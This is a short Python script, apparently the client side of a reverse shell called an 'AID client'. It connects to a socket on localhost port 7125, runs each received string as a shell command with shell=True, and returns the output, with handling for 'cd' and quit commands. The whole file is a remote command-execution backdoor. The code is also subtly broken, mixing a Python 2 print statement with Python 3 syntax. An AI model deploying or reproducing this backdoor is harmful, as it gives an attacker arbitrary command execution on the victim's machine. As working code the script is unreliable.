#!/usr/bin/env python

import socket
from os import chdir
from subprocess import check_output
sock = socket.socket()
sock.connect(('localhost', 7125))

while 1:
    x = sock.recv(1024)
    print(x)
     #p = subprocess.Popen(x, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     #out, error = p.communicate()
     #subprocess.call(x, shell=True)
     #print(out)
    try:
        if 'cd' in x.decode():
            chdir(x[3:])
            out = check_output("ls", shell=True)
            sock.send(out)
        elif x.decode('utf-8') == "":
            sock.close()
            break
        elif x.decode() == 'q':
            print"\nClosing the connection\n"
            sock.close()
            break
        else:
            out = check_output(x, shell=True)
            sock.send(out)
        continue

    except FileNotFoundError:
        print("\nNo such of file or Directory, please check the name\n")
        out = check_output("pwd", shell=True)
        sock.send(out)
    except KeyboardInterrupt:
        print("\nClosing the AID client \nExiting...")
        sock.close()